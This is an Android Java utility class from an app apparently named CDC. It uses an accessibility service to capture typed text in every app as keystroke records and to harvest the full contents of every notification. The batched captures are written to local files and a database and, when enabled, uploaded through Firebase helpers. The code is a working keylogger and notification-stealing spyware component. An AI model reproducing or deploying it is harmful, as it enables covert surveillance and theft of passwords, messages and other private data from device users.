package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.convertToString;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.text.format.DateFormat;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;

import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.data.ApplicationData;
import com.vikasyadavnsit.cdc.data.DeviceData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.services.CDCAccessibilityService;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.Collectors;

public class AccessibilityUtils {

    private static final long BATCH_INTERVAL_MS = 15000; // Batch every 15 seconds
    private static final int MAX_BATCH_SIZE = 30; // Process when entries exceed 30
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final List<KeyStrokeData> textChanges = new ArrayList<>();
    private static final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private static ApplicationDataRepository applicationDataRepository;

    public static void startAccessibilitySettingIntent(Context context) {
        if (!isAccessibilityServiceEnabled(context, CDCAccessibilityService.class)) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            context.startActivity(intent);
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends android.accessibilityservice.AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo enabledService : enabledServices) {
            if (enabledService.getId().equals(context.getPackageName() + "/" + service.getName())) {
                return true;
            }
        }
        return false;
    }

    public static void processTextChangedEvent(AccessibilityEvent event) {
        String changedText = event.getText().stream().collect(Collectors.joining());
        if (!TextUtils.isEmpty(changedText)) {
            synchronized (textChanges) {
                // Remove the last text change if it matches the current text change
//                if (!textChanges.isEmpty() && changedText.contains(textChanges.get(textChanges.size() - 1).getText())) {
//                    textChanges.remove(textChanges.size() - 1);
//                }
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
                KeyStrokeData keyStrokeData = KeyStrokeData.builder()
                        .appPackage(packageName)
                        .text(changedText)
                        .timestamp(LocalDateTime.now().toString())
                        .build();
                textChanges.add(keyStrokeData);

                if (textChanges.size() >= MAX_BATCH_SIZE) {
                    handler.removeCallbacks(processTextChangesRunnable);
                    handler.post(processTextChangesRunnable);
                } else {
                    handler.postDelayed(processTextChangesRunnable, BATCH_INTERVAL_MS);
                }

            }
        }
    }

    private static final Runnable processTextChangesRunnable = new Runnable() {
        @Override
        public void run() {
            List<KeyStrokeData> textBatch;
            synchronized (textChanges) {
                textBatch = new ArrayList<>(textChanges);
                textChanges.clear();
            }
            executorService.execute(() -> processTextChanges(textBatch));
        }
    };

    private static void processTextChanges(List<KeyStrokeData> textBatch) {
        ApplicationData appData = applicationDataRepository.getRecordByKey(ClickActions.CAPTURE_KEY_STROKES.name());
        User.AppTriggerSettingsData appTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);

        if (appTriggerSettingsData != null && appTriggerSettingsData.isEnabled()) {
            for (KeyStrokeData keyStrokeData : textBatch) {
                String keyStrokeText = "Package :" + keyStrokeData.getAppPackage() + " Text :" + keyStrokeData.getText();

                if (appTriggerSettingsData.isSaveOnLocalFile())
                    FileUtils.appendDataToFile(FileMap.KEYSTROKE, keyStrokeText);

                if (appTriggerSettingsData.isUploadDataSnapshot())
                    FirebaseUtils.uploadUserKeystrokeDataSnapshot(keyStrokeData);

                DeviceDataRepository.insert(DeviceData.builder()
                        .value(new Gson().toJson(keyStrokeData))
                        .fileMapType(FileMap.KEYSTROKE)
                        .build());
            }
        }
    }

    public static void processNotificationEvent(AccessibilityEvent event) {
        try {
            Notification notification = (Notification) event.getParcelableData();
            NotificationData notificationData = NotificationData.builder().build();

            if (Objects.nonNull(notification) && Objects.nonNull(notification.extras)) {
                Map<String, Object> map = new HashMap<>();
                for (String key : notification.extras.keySet()) {
                    Object data = notification.extras.get(key);
                    if (Objects.nonNull(data)) {
                        map.put(key.replace(".", "_"), convertToString(data));
                    }
                }
                notificationData.setExtras(map);
                notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(notification.when)).toString());
            } else {
                notificationData.setExtras(Map.of("data", event.getText().stream().collect(Collectors.joining(", "))));
                notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(event.getEventTime())).toString());
            }
            notificationData.setPackageName(event.getPackageName().toString());
            collectNotificationData(notificationData);
        } catch (Exception e) {
            e.printStackTrace();
            LoggerUtils.e("AccessibilityUtils", "Exception in processNotificationEvent :: " + e.getMessage());
        }
    }

    private static void collectNotificationData(NotificationData notificationData) {
        ApplicationData appData = applicationDataRepository.getRecordByKey(ClickActions.CAPTURE_NOTIFICATIONS.name());
        User.AppTriggerSettingsData appTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);

        if (appTriggerSettingsData != null && appTriggerSettingsData.isEnabled()) {

            if (appTriggerSettingsData.isSaveOnLocalFile())
                FileUtils.appendDataToFile(FileMap.NOTIFICATION, notificationData.toString());

            if (appTriggerSettingsData.isUploadDataSnapshot())
                FirebaseUtils.uploadUserNotificationDataSnapshot(notificationData);

            DeviceDataRepository.insert(DeviceData.builder()
                    .value(new Gson().toJson(notificationData)).fileMapType(FileMap.NOTIFICATION).build());
        }
    }

}
